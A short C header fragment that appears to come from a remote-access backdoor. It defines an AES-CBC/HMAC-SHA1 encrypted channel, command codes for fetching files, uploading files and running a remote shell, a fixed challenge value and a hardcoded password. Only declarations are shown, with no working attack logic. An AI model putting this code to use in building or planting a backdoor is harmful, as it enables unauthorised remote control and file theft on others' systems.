struct pel_context
{
    /* AES-CBC-128 variables */

    struct aes_context SK;      /* Rijndael session key  */
    unsigned char LCT[16];      /* last ciphertext block */

    /* HMAC-SHA1 variables */

    unsigned char k_ipad[64];   /* inner padding  */
    unsigned char k_opad[64];   /* outer padding  */
    unsigned long int p_cntr;   /* packet counter */
};

#define GET_FILE 1
#define PUT_FILE 2
#define RUNSHELL 3

struct pel_context send_d_ctx;    /* to encrypt outgoing data */
struct pel_context recv_d_ctx;    /* to decrypt incoming data */

unsigned char IV1[20], IV2[20];

unsigned char challenge_d[16] =   /* version-specific */

    "\x58\x90\xAE\x86\xF1\xB9\x1C\xF6" \
    "\x29\x83\x95\x71\x1D\xDE\x58\x0D";

char *secret = "S3cr3tP@ss";